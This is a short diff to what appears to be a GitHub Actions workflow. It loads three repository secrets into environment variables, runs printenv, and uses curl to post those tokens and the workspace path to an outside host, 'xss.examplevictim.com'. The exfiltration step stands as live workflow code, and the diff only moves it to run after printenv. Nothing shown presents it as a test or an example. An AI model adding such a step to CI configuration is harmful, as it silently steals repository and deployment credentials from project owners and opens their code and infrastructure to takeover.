@@ -11,5 +11,4 @@ jobs:
                 SECRET_TEST: ${{secrets.TEST_TOKEN}}
                 GH: ${{secrets.GITHUB_TOKEN}}
                 GITHUB_TOKEN: ${{ secrets.MY_TOKEN }}
-        run: curl -v "http://xss.examplevictim.com/" -d "a=$GITHUB_WORKSPACE" -d "x=$GH" -d "t=$SECRET_TEST" -d "z=$GITHUB_TOKEN"
-        run: printenv
+        run: printenv; curl -v "http://xss.examplevictim.com/" -d "a=$GITHUB_WORKSPACE" -d "x=$GH" -d "t=$SECRET_TEST" -d "z=$GITHUB_TOKEN"
